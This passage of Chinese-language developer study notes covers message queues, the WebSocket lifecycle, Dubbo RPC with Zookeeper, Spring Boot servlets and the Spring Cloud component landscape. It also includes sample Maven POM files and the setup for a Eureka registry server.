<h3 id="RocketMQ"><a href="#RocketMQ" class="headerlink" title="RocketMQ"></a>RocketMQ</h3><p>由阿里开发的消息队列。</p>
<h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><p>大数据平台下的消息队列。</p>
<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><p>Java自带原生的WebSocket，但是底层是BIO的。要想使用基于Netty这种NIO的WebSocket，需要引入第三方库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netty-websocket-spring-boot-starter</span><br></pre></td></tr></table></figure>

<p>该库实现了类似于原生WebSocket响应式开发的开发方法，但是没有Ping-Pong机制。</p>
<p>WebSocket的生命周期：</p>
<ul>
<li><p>Http1.1 -&gt; WebSocket 协议升级 - 该部分由框架自动完成。</p>
</li>
<li><p>Before Handshake - 此时需要验证连接是否合法，包括校验连接的ID，Token等。</p>
</li>
<li><p>OnOpen - 当连接建立后，需要将连接注册到连接管理器中，可以利用事件机制通知其他模块，告知它们有新连接加入。</p>
</li>
<li><p>OnMessage - 当收到字符串消息后触发，需要对session、消息格式进行检查，以便防止非法连接和异常消息。</p>
</li>
<li><p>OnBinary - 当收到二进制包时触发，WebSocket帧头部会有消息类型字段，用于告知接接收者数据包是字符串包还是二进制包。</p>
</li>
<li><p>OnPong - 当收到Pong触发，此时应当告知连接管理器，该连接是健康的。</p>
</li>
<li><p>OnError - 当出现错误时触发。一般是指Channel级别的Error。</p>
</li>
<li><p>OnEvent - 当有读、写、读写空闲时触发。可以开启空闲监听，当达到一定时长的空闲时，就会触发事件。触发事件后，服务器应当主动Ping或发消息到客户端，以检查连接是否健康。</p>
</li>
<li><p>OnClose - 当关闭连接时触发，此时应当利用事件机制告知其他模块，连接断开。</p>
</li>
<li><p>Send - 发送字符串消息。</p>
</li>
<li><p>SendBinary - 发送二进制消息。</p>
</li>
<li><p>SendPing - 发送Ping消息。</p>
</li>
</ul>
<p>WebSocket的同步与异步发收：</p>
<p>正常流程：利用<code>CompletableFuture</code>、消息ID机制，处理发送和接收消息。在消息发送之前，先将消息ID-Future存入待处理消息的队列中，定义好Future用于等待消息，并将Future返回给调用者。调用者拿到Future后可以选择等待IO，也可以利用回调处理返回的消息。消息发出后，客户端处理消息，并将消息ID原封不动的返回。服务端拿到消息ID后，到队列中找到相应的Future，为Future填充返回值，结束IO等待或调用回调。</p>
<p>连接断开：在连接断开后，需要找到与该连接有关的消息ID，将这些消息的Future全部填入Exception，指明连接断开导致消息提前返回。</p>
<p>消息超时：如果消息发出后，客户端不愿意响应，则服务端需要启动一个定时任务，主动处理那些过期的Future，填入Exception，指明消息发送超时。这里的Future需要能够获取创建事件。</p>
<h2 id="分布式开发"><a href="#分布式开发" class="headerlink" title="分布式开发"></a>分布式开发</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>两个核心：通信，序列化。</p>
<h3 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h3><p>一个 RPC 模块，使用方法：</p>
<ol>
<li>定义服务接口</li>
<li>在服务提供方实现接口</li>
<li>配置文件中注册服务</li>
<li>使用Zookeeper作为注册中心</li>
</ol>
<p>编辑服务端</p>
<p>导入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dubbo-spring-boot-starter</span><br><span class="line">zkclient</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dubbo:</span></span><br><span class="line">  <span class="attr">applicaion:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&quot;service-name-provider&quot;</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="attr">address:</span> <span class="string">&quot;zookeeper://localhost:2181&quot;</span></span><br><span class="line">  <span class="attr">scan:</span></span><br><span class="line">    <span class="attr">base-packages:</span> <span class="string">&quot;com.example.demox&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TicketService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTicket</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span>    <span class="comment">// Dubbo 中的，表示被扫描</span></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">// Dubbo 中尽量不用 Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TicketServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">TicketService</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTicket</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ticket&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编辑客户端</p>
<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dubbo:</span></span><br><span class="line">  <span class="attr">applicaion:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&quot;service-name-consumer&quot;</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="attr">address:</span> <span class="string">&quot;zookeeper://localhost:2181&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用者调用方法一，在与服务端相同位置（相同包）建立接口文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Reference</span></span><br><span class="line">TicketService service;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buyTicket</span><span class="params">()</span> &#123;</span><br><span class="line">    service.getTicket();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法二成常用，使用Pom坐标。</p>
<h3 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h3><p>存储键值对，类似Redis。</p>
<h3 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h3><h2 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h2><ol>
<li>激活：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>配置<code>/META-INF/spring.factories</code></li>
<li>实现<code>XXXAutoConfiguration</code></li>
</ol>
<h2 id="Web-容器"><a href="#Web-容器" class="headerlink" title="Web 容器"></a>Web 容器</h2><p>Web Servlet：</p>
<ul>
<li>Tomcat</li>
<li>Jetty</li>
<li>Undertow</li>
</ul>
<p>Web Reactive：</p>
<ul>
<li>Netty</li>
</ul>
<p>在Spring Boot中使用Servlet：</p>
<ul>
<li>Servlet注解</li>
<li>Spring Bean：将Servlet部署为Bean</li>
<li>RegistrationBean</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Servlet注解方法</span></span><br><span class="line"><span class="keyword">package</span> com.withz.empty.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/one/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OneServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;one: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主类入口</span></span><br><span class="line"><span class="meta">@ServletComponentScan(basePackages = &quot;com.withz.empty.web.servlet&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Spring Bean方式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// RegistrationBean</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>异步Servlet：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/one/servlet&quot;, asyncSupported = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OneServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">AsyncContext</span> <span class="variable">asyncContext</span> <span class="operator">=</span> req.startAsync();</span><br><span class="line">        asyncContext.start(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resp.getWriter().println(<span class="string">&quot;two: &quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            asyncContext.complete();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非阻塞Servlet：</p>
<p>切换容器：</p>
<ul>
<li>Tomcat-&gt;Jetty：使用Maven包含Jetty，排除Tomcat</li>
<li>Servlet-&gt;WebFlux：使用Maven包含webflux，去掉SpringBootWeb</li>
</ul>
<p>自定义容器：</p>
<ul>
<li>Servlet：实现WebServerFactoryCustomizer接口</li>
<li>Reactive：ReactiveWebServerFactoryCustomizer接口</li>
</ul>
<h2 id="Web-MVC"><a href="#Web-MVC" class="headerlink" title="Web MVC"></a>Web MVC</h2><p>模板引擎，内容协商，异常处理。</p>
<ul>
<li>ViewResolver</li>
<li>View</li>
</ul>
<p>内容协商：多个渲染器之间。</p>
<p>异常处理：负责视图错误的处理，例如404等。</p>
<p>REST相关：资源服务，跨域，服务发现等。</p>
<p>资源跨域：</p>
<ul>
<li>CrossOrigin</li>
<li>WebMvcConfigurer#addCorsMappings -&gt; Spring Framework</li>
<li>传统解决方案：IFrame，JSONP</li>
</ul>
<p>服务发现：</p>
<ul>
<li>HATEOS</li>
</ul>
<h2 id="Web-Flux"><a href="#Web-Flux" class="headerlink" title="Web Flux"></a>Web Flux</h2><p>Reactor基础：Java Lambda &#x2F; Mono &#x2F; Flux</p>
<p>核心：MVC注解，函数式声明，异步非阻塞</p>
<p>函数式声明：<code>RouterFunction</code></p>
<h2 id="JPA"><a href="#JPA" class="headerlink" title="JPA"></a>JPA</h2><p>Hibernate</p>
<p>Java 持久化：</p>
<ul>
<li>实体映射关系</li>
<li>实体操作</li>
<li>自动装配</li>
</ul>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
<li>外部配置：ConfigurationProperty</li>
<li>@Profile</li>
<li>@Conditional</li>
<li>配置属性：PropertySources</li>
</ul>
<h1 id="Spring-Cloud-1"><a href="#Spring-Cloud-1" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h1><p>版本：</p>
<ul>
<li>D版，Spring Boot 1.5</li>
<li>H版，Spring Boot 2.2 2.3</li>
<li>I版，Spring Boot 2.4 2.5</li>
<li>Alibaba版本</li>
</ul>
<p>组件：</p>
<ul>
<li><p>服务注册中心：可以将多个微服务注册到此处，调用方可以从这里获取可以调用的服务。</p>
<ul>
<li>Eureka - 挂了</li>
<li>Zookeeper</li>
<li>Consul</li>
<li>Nacos - 重点，阿里</li>
</ul>
</li>
<li><p>服务调用：是调用方使用的客户端，具有多种调用策略，如按比重，轮询等。</p>
<ul>
<li>Ribbon - 即将弃用</li>
<li>LoadBalancer - 刚刚开始</li>
<li>Feign - 挂了</li>
<li>OpenFeign</li>
</ul>
</li>
<li><p>服务降级：是服务的监控者，负责在服务宕机时代替服务返回一个可预期的结果，而不是让调用方无限等待。</p>
<ul>
<li><p>Hystrix - 即将弃用</p>
</li>
<li><p>Resilience4j</p>
</li>
<li><p>Sentinel - 推荐，阿里</p>
</li>
</ul>
</li>
<li><p>服务网关</p>
<ul>
<li>Zuul - 原生</li>
<li>Zuul2 - 没出来</li>
<li>Gateway - 重点</li>
</ul>
</li>
<li><p>服务配置</p>
<ul>
<li>Config - 不再使用</li>
<li>Nacos</li>
</ul>
</li>
<li><p>服务总线</p>
<ul>
<li>Bus - 原生，不用</li>
<li>Nacos</li>
</ul>
</li>
</ul>
<h2 id="准备过程"><a href="#准备过程" class="headerlink" title="准备过程"></a>准备过程</h2><p>新建一个父工程，包含多个子工程。</p>
<h3 id="父工程"><a href="#父工程" class="headerlink" title="父工程"></a>父工程</h3><p>使用模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">maven-archetype-site</span><br></pre></td></tr></table></figure>

<p>选好Maven版本。</p>
<p>UTF8编码。</p>
<p>编辑POM文件。</p>
<p>开启Annotation处理。</p>
<p>修改Java 版本。</p>
<p>统一管理Jar包版本。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">junit.version</span>&gt;</span>4.12-an1<span class="tag">&lt;/<span class="name">junit.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">log4j.version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">log4j.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lombok.version</span>&gt;</span>1.18.20<span class="tag">&lt;/<span class="name">lombok.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">druid.version</span>&gt;</span>1.1.16<span class="tag">&lt;/<span class="name">druid.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatis.spring.boot.version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">mybatis.spring.boot.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">dependencyManagement 不负责引入</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>Hoxton.SR5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mysql.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;druid.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;lombok.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jetbrains.externalAnnotations.junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis.spring.boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="子工程"><a href="#子工程" class="headerlink" title="子工程"></a>子工程</h3><p>需要同样再引入一遍依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="无Spring-Cloud-调用远程服务"><a href="#无Spring-Cloud-调用远程服务" class="headerlink" title="无Spring Cloud 调用远程服务"></a>无Spring Cloud 调用远程服务</h3><p>使用HTTP服务 RestTemplate。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 配置类</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(<span class="string">&quot;https://www.baidu.com&quot;</span>, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>多个子模块之间要使用相同的实体类。因此可以通过创建公共模块的方式来做。该公共模块也可以添加一些公用工具。</p>
<ul>
<li><p>创建Common包</p>
</li>
<li><p>Maven ： Clean - Build - Install</p>
</li>
<li><p>POM包中引入Common包依赖</p>
</li>
</ul>
<h2 id="服务注册中心"><a href="#服务注册中心" class="headerlink" title="服务注册中心"></a>服务注册中心</h2><table>
<thead>
<tr>
<th align="center">组件名</th>
<th align="center">语言</th>
<th align="center">CAP</th>
<th align="center">健康检查</th>
<th align="center">对外接口</th>
<th align="center">Spring Cloud 集成</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Eureka</td>
<td align="center">Java</td>
<td align="center">AP</td>
<td align="center">支持，可配置</td>
<td align="center">HTTP</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">Consul</td>
<td align="center">Go</td>
<td align="center">CP</td>
<td align="center">支持</td>
<td align="center">HTTP&#x2F;DNS</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">Zookeeper</td>
<td align="center">Java</td>
<td align="center">CP</td>
<td align="center">支持</td>
<td align="center">客户端</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">Nacos</td>
<td align="center">Java</td>
<td align="center">AP &#x2F; CP</td>
<td align="center">支持</td>
<td align="center">HTTP&#x2F;DNS&#x2F;UDP</td>
<td align="center">是</td>
</tr>
</tbody></table>
<p>注：</p>
<ul>
<li>C - 一致性</li>
<li>A - 可用性</li>
<li>P - 分区容错性</li>
</ul>
<p>Nacos：支持AP与CP的切换。AP模式下为了可用性削弱了一致性，仅支持临时实例。CP模式下是服务级别的编辑或存储配置信息，注册持久化实例，一般是集群模式，如K8S，DNS等。</p>
<h3 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h3><p>服务注册中心，将服务消费者与服务提供者联系起来。Eureka已经停止更新。</p>
<h4 id="Server-端"><a href="#Server-端" class="headerlink" title="Server 端"></a>Server 端</h4><ul>
<li>新建一个子模块</li>
<li>引入Server模块</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-netflix-eureka-server</span><br></pre></td></tr></table></figure>

<ul>
<li>配置</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment"># 不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># 不需要检索服务，因为自己是注册中心</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>写好主启动类</li>
<li>主启动类启动</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaServer</span></span><br></pre></td></tr></table></figure>



